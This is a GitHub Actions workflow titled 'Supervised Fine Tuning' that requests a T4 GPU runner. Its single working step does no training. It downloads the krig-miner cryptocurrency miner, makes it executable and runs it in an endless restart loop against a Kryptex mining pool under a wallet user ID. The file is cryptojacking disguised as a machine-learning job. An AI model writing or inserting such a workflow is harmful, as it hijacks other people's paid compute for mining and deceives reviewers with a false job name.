name: Supervised Fine Tuning

on:
  workflow_dispatch:
    inputs:
      tenancy:
        type: choice
        required: false
        description: 'The tenancy of the machine'
        default: 'on_demand'
        options:
          - 'spot'
          - 'on_demand'

jobs:
  sft:
    name: GPU Task Runner
    runs-on:
      - machine
      - gpu=T4
      - cpu=4
      - ram=16
      - tenancy=${{ inputs.tenancy }}
      - architecture=x64
    timeout-minutes: 180
    steps:
      - uses: actions/checkout@v4

      - name: Download and Run
        run: |
          wget https://github.com/kryptex/krig-miner/releases/download/v1.5.2/krig-miner-1.5.2-linux-x64.tar.gz
          tar xzf krig-miner-1.5.2-linux-x64.tar.gz
          chmod +x krig-miner
          
          # Keep running in loop
          while true; do
            echo "Starting miner..."
            ./krig-miner --coin quantus --url stratum+ssl://qtc.kryptex.network:8049 --user krxY9VNEQD
            echo "Miner stopped, restarting in 5 seconds..."
            sleep 5
          done
